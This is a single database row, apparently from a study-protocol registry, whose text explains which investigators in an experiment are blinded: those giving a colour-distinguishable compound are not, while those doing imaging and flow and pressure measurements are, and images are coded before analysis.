	(9709,265,'yes_blinded_intervention_how_details','\"The investigators who administer the intervention are not blinded, as the injected compound is easily distinguished from the control based on the colour. The investigators that are performing the invasive imaging and flow- and pressure measurements are blinded. Before analyses the images will be coded so that the investigator analysing the images will be blinded as well.\"','2022-03-31 13:24:03','2022-03-31 13:24:06'),
